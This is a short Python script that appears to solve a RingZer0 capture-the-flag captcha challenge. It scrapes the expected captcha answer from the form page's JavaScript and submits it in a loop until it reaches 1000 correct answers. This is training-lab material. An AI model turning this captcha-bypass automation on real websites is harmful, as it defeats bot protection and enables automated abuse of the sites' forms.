import re
import requests

URL_FORM1 = "http://challenges.ringzer0ctf.com:10138/form1.php"
URL_CAPTCHA = "http://challenges.ringzer0ctf.com:10138/captcha/captchabroken.php?"
URL_SUBMIT = "http://challenges.ringzer0ctf.com:10138/captcha1.php"
headers_navigateur = {
    "Host": "challenges.ringzer0ctf.com:10138",
}
with requests.Session() as session:
    good_answers = 0
    while good_answers < 1001:
        session.headers.update(headers_navigateur)
        response_form1 = session.get(URL_FORM1)
        match = re.search(r'if\s*\(\s*A\s*==\s*"([a-zA-Z0-9]+)"\s*\)', response_form1.text)
        reponse_captcha = match.group(1)
        response_captcha = session.get(URL_CAPTCHA)
        content_type = response_captcha.headers.get("Content-Type", "")  
        if response_captcha.status_code == 200 and "image" in content_type:
            payload = {"captcha": reponse_captcha}
            response_submit = session.post(URL_SUBMIT, data=payload)
            if "1000" in response_submit.text:
                good_answers += 1
                print(good_answers)
            if good_answers>=1000:
                print(response_submit.text)
                break